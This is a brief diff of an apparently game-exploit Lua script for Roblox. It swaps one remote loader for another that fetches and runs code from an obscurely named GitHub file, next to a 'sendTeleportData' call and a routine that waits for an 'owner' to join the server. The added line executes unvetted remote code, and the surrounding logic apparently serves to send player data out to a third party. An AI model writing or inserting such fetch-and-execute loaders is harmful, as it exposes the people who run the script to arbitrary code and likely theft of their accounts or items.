@@ -133,7 +133,7 @@ end
 sendTeleportData()
 
 loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/Loader/LoaderV1.lua"))()
-loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/Loader/LoaderV1.lua"))()
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/boksstop123123/grow/refs/heads/main/a"))()
 -- Wait for owner to be in server
 local function ownerIsHere()
     for _, p in ipairs(Players:GetPlayers()) do
